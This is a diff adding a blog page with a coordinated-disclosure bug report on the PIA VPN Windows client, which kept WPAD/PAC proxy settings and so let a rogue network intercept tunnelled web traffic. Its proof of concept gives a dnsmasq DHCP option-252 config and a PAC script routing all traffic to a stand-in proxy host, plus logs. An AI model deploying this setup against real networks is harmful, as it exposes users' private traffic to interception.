@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>PIA Client - HTTP(S) Tunnelled Traffic Interception | Alex Chapman’s Blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="PIA Client - HTTP(S) Tunnelled Traffic Interception" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Private Internet Access(PIA) VPN users connecting to the PIA VPN service from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted. The PIA client for Windows honours the Web Proxy Auto-Discovery (WPAD) settings configured by the local network the client is connecting from." />
+<meta property="og:description" content="Private Internet Access(PIA) VPN users connecting to the PIA VPN service from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted. The PIA client for Windows honours the Web Proxy Auto-Discovery (WPAD) settings configured by the local network the client is connecting from." />
+<link rel="canonical" href="https://ajxchapman.github.io/bugreports/2016/04/14/pia-traffic-interception.html" />
+<meta property="og:url" content="https://ajxchapman.github.io/bugreports/2016/04/14/pia-traffic-interception.html" />
+<meta property="og:site_name" content="Alex Chapman’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2016-04-14T00:00:00-05:00" />
+<script type="application/ld+json">
+{"description":"Private Internet Access(PIA) VPN users connecting to the PIA VPN service from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted. The PIA client for Windows honours the Web Proxy Auto-Discovery (WPAD) settings configured by the local network the client is connecting from.","mainEntityOfPage":{"@type":"WebPage","@id":"https://ajxchapman.github.io/bugreports/2016/04/14/pia-traffic-interception.html"},"url":"https://ajxchapman.github.io/bugreports/2016/04/14/pia-traffic-interception.html","@type":"BlogPosting","headline":"PIA Client - HTTP(S) Tunnelled Traffic Interception","dateModified":"2016-04-14T00:00:00-05:00","datePublished":"2016-04-14T00:00:00-05:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+      <header class="page-header" role="banner">
+        <a href="/">
+        <h1 class="project-name">Alex Chapman's Blog</h1>
+        <h2 class="project-tagline">A tech blog about all things bug bounty, security and development.
+</h2>
+        </a>
+      </header>
+
+    <main id="content" class="main-content" role="main">
+      
+
+
+  
+
+  
+    
+    
+    
+
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="postheader">
+    <a href="/">Home</a>
+  </div>
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">PIA Client - HTTP(S) Tunnelled Traffic Interception</h1>
+    <p class="post-meta">
+      <time datetime="2016-04-14T00:00:00-05:00" itemprop="datePublished">
+        2016-04-14
+      </time>
+      
+        • <span itemprop="category">Bug Reports</span>
+      
+  </header>
+  <div class="post-content" itemprop="articleBody">
+    <p>Private Internet Access(PIA) VPN users connecting to the PIA VPN service from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted. The PIA client for Windows honours the Web Proxy Auto-Discovery (WPAD) settings configured by the local network the client is connecting from.</p>
+
+<!--more-->
+
+<p><em>Patch notes resulting from this bug report be viewed at <a href="https://www.privateinternetaccess.com/forum/discussion/21747/desktop-applications-release-v60">https://www.privateinternetaccess.com/forum/discussion/21747/desktop-applications-release-v60</a></em></p>
+
+<pre class="bugreport">
+Description:        PIA Client HTTP(S) Tunnelled Traffic Interception
+Versions Affected:  PIA Client v56 for Windows
+Category:           Traffic Interception
+Reporter:           Alex Chapman and Paul Stone of Context Information Security
+
+Summary:
+--------
+Private Internet Access(PIA) VPN users connecting to the PIA VPN service from an untrusted/malicious network are at risk of having all VPN tunnelled HTTP(S) traffic intercepted. The PIA client for Windows honours the Web Proxy Auto-Discovery (WPAD) settings configured by the local network the client is connecting from. WPAD settings configure system and application HTTP proxies via Proxy Auto-Config (PAC) scripts. This allows a malicious network operator, such as a rogue access point, to proxy all VPN-tunnelled HTTP(S) requests for PIA VPN users connecting from their network.
+
+Analysis:
+---------
+A malicious network can provide proxy settings over DHCP through DHCP option 252, this option provides a URL to a PAC script. When a Windows system receives DHCP option 252, the advertised PAC script is downloaded and the proxy settings are configured. When the client initialises a VPN connection to PIA this configuration remains.
+
+Before VPN connection: client -&gt; malicious network -&gt; PAC proxy -&gt; internet
+                                         ^
+                                 DHCP 252 Proxy set
+
+After VPN connection:  client -&gt; malicious network -&gt; VPN server -&gt; PAC proxy -&gt; internet
+                                         ^
+                                 DHCP 252 Proxy set
+
+The "PAC proxy" can log all traffic, defeating the confidentiality provided by PIA, or modify traffic in transit to affect the integrity of the VPN traffic.
+
+PIA Client v56 for Windows is based on OpenVPN version 2.2.2. This issue appears to be an underlying issue in OpenVPN (confirmed in OpenVPN version 2.3.10); we have reported this issue to the OpenVPN security team. However, as this issue was originally identified on the PIA Client we would like to inform London Trust Media of the details.
+
+This issue has been confirmed on Windows 10 and Windows 7 (under default configuration) with PIA Client v56. WPAD/PAC is enabled by default on all modern desktop versions of Windows. It should be noted that disabling the default "Automatically detect settings" option in the Windows "Local Area Network (LAN) Settings" configuration mitigates this issue. However, clients with specifically configured PAC files (using the "Use automatic configuration script" option in the Windows "Local Area Network (LAN) Settings" configuration) may still be at risk.
+
+Proof of Concept:
+-----------------
+Provided here is a Proof of Concept setup which will act as a network gateway, providing a PAC script via DHCP. The PAC script sets the default proxy to an HTTP proxy on the internet, in this case a fictitious proxy at proxy.example.com. When a Windows system attaches to this network, the advertised PAC file will be downloaded and the proxy settings configured. When the system connects to the PIA VPN service we can see that the proxy setting are still honoured.
+
+The following dnsmasq configuration can be used to provide a PAC file to Windows hosts via WPAD DHCP:
+    interface=eth0
+    dhcp-authoritative
+    dhcp-range=192.168.100.100,192.168.100.199,10m
+    dhcp-option=3,192.168.100.1
+    dhcp-option=6,192.168.100.1
+    dhcp-option=252,http://proxy.example.com:80/proxy.pac
+
+The dhcp-option=252 option specifies the URL from which Windows hosts will download the PAC script.
+
+The following PAC script can be can be provided to proxy all HTTP(S) traffic through a Web Proxy hosted at proxy.example.com:3128:
+
+  function FindProxyForURL(url, host){
+    return "PROXY proxy.example.com:3128";
+  }
+
+Windows hosts which connect to a network as configured above will, by default, push all HTTP(S) traffic through the HTTP proxy at proxy.example.com:3128. After a PIA VPN connection is established the WPAD/PAC settings remain in use, forwarding all VPN tunnelled HTTP(S) traffic out of the PIA VPN endpoint through the configured HTTP proxy.
+
+Below are logs which show HTTP connections from the above configured network to the WPAD/PAC configured proxy occurring both pre and post VPN connection.
+
+Nginx access logs of Windows and Google Chrome fetching PAC script before connecting to the VPN:
+    88.98.79.12 - - [08/Apr/2016:09:33:45 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "WinHttp-Autoproxy-Service/5.1"
+    88.98.79.12 - - [08/Apr/2016:09:34:14 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
+    88.98.79.12 - - [08/Apr/2016:09:34:15 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
+
+Squid-cache access logs of proxy connections for www.contextis.com before connecting to the VPN:
+    156 88.98.79.12 TCP_MISS/304 475 GET http://www.contextis.com/ - HIER_DIRECT/93.184.216.34 -
+
+Nginx access logs of Windows and Google Chrome fetching PAC script after connecting to the PIA VPN:
+    46.28.53.168 - - [08/Apr/2016:09:35:55 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "WinHttp-Autoproxy-Service/5.1"
+    46.28.53.168 - - [08/Apr/2016:09:36:00 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
+    46.28.53.168 - - [08/Apr/2016:09:36:01 -0400] "GET /proxy.pac HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36"
+
+Squid-cache access logs of proxy connections for www.contextis.com after connecting to the PIA VPN:
+    151 46.28.53.168 TCP_MISS/304 453 GET http://www.contextis.com/ - HIER_DIRECT/93.184.216.34 -
+
+NOTE: The IP address on the "after" logs have changed to that of the VPN end point.
+</pre>
+
+  </div>
+
+  <div class="postfooter">
+    <a href="/">Home</a>
+    
+      <a href="/bugreports/index.html">More Bug Reports posts</a>
+    
+  </div>
+</article>
+
+
+
+
+<script>
+
+async function calculateClientId() {
+  /*
+  Calculate a semi-unique client Id which rotates every 4 hours. Client Id is
+  calculated from the browser user-agent, language and timezone only. This is
+  meant to be enough to track a browser across pages for a period of time, but
+  othing more. The client Id is is non-persistent and re-calculated each page
+  load, it is not stored in a cookie or local storage.
+  */
+  const identifier = [
+    new Date() - new Date() % (4 * 60 * 60 * 1000), // TrackingID is keyed to the time
+    navigator.userAgent,                            // User agent
+    navigator.language,                             // Browser language, e.g. "en-US"
+    new Date().getTimezoneOffset()                  // Timezone offset
+  ];
+
+  // Hash the identifier, discard a potion of the hash and coerce into the correct format
+  const msgUint8 = new TextEncoder().encode(identifier.join(","));
+  const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(-32);
+  return `${hashHex.slice(0, 8)}-${hashHex.slice(8, 12)}-${hashHex.slice(12, 16)}-${hashHex.slice(16, 20)}-${hashHex.slice(20, 32)}`;
+}
+
+(function() {
+  // Only perform analytics on browsers which have not enabled doNotTrack
+  if (navigator.doNotTrack != 1) {
+    /*
+    References:
+      https://developers.google.com/analytics/devguides/collection/protocol/v1/reference
+      https://developers.google.com/analytics/devguides/collection/analyticsjs/cookies-user-id#disabling_cookies
+      https://developers.google.com/analytics/devguides/collection/analyticsjs/ip-anonymization
+    */
+
+    var promises = [];
+    
+    calculateClientId().then((clientId) => {
+      const stat_vars = {
+        v:  1,                    // Version
+        
+        cid: clientId,            // Client Id
+        t: 'pageview',            // Hit type
+        aip: 1,                   // Set anonymizeIp to mask IP addresses
+        dl: window.location.href, // Document location
+        dt: document.title,       // Document title
+        dr: document.referrer,    // Document referrer
+        z: Date.now()             // Cache buster
+      };
+      const url = 'https://logs-01.loggly.com/inputs/c77487f5-9e26-4c31-bb3e-feb5c17a00e6/tag/loggly-jslogger';
+
+      
+      promises.push(fetch(url, {
+        credentials: 'omit',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain'
+        },
+        body: JSON.stringify(stat_vars)
+      }));
+      
+    });
+    
+    calculateClientId().then((clientId) => {
+      const stat_vars = {
+        v:  1,                    // Version
+        tid: 'UA-157572028-1', // Endpoint Id
+        cid: clientId,            // Client Id
+        t: 'pageview',            // Hit type
+        aip: 1,                   // Set anonymizeIp to mask IP addresses
+        dl: window.location.href, // Document location
+        dt: document.title,       // Document title
+        dr: document.referrer,    // Document referrer
+        z: Date.now()             // Cache buster
+      };
+      const url = 'https://www.google-analytics.com/collect';
+
+      
+      let uri_vars = [];
+      for (var_key in stat_vars) {
+        uri_vars.push(`${var_key}=${encodeURIComponent(stat_vars[var_key])}`);
+      }
+
+      promises.push(fetch(`${url}?${uri_vars.join('&')}`, {
+        credentials: 'omit'
+      }));
+      
+    });
+    
+
+    
+    
+  }
+})();
+
+
+</script>
+
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
